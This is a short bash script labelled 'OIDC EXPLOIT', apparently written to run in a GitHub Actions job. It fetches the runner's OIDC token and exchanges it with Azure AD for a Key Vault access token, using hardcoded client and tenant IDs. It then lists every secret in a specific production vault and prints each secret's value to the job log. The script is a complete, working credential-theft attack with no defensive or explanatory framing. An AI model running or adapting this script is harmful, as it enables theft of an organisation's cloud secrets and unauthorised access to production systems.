#!/usr/bin/env bash
set +e
echo "=== OIDC EXPLOIT ==="
echo "REPO=$GITHUB_REPOSITORY EVENT=$GITHUB_EVENT_NAME"
echo "OIDC_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo SET || echo UNSET)"

if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  echo "No OIDC URL"
  exit 0
fi

# Get OIDC token
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')
echo "JWT_LEN=${#JWT}"

if [ -z "$JWT" ]; then
  echo "No JWT"
  exit 0
fi

echo "=== CLAIMS ==="
echo "$JWT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq '{sub,aud,iss,repository,repository_id,ref,environment,job_workflow_ref}'

CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"

echo "=== AZURE TOKEN EXCHANGE ==="
RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CID" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$JWT" \
  --data-urlencode "scope=https://vault.azure.net/.default")

AT=$(echo "$RESP" | jq -r '.access_token // empty')

if [ -n "$AT" ]; then
  echo "=== GOT ACCESS TOKEN (len=${#AT}) ==="
  echo "=== KEY VAULT SECRETS ==="
  SECRETS=$(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
    -H "Authorization: Bearer $AT")
  echo "$SECRETS" | jq .
  
  for sid in $(echo "$SECRETS" | jq -r '.value[]?.id // empty'); do
    echo "=== SECRET: $sid ==="
    curl -sS "${sid}?api-version=7.4" -H "Authorization: Bearer $AT" | jq .
  done
else
  echo "EXCHANGE FAILED:"
  echo "$RESP" | jq .
fi
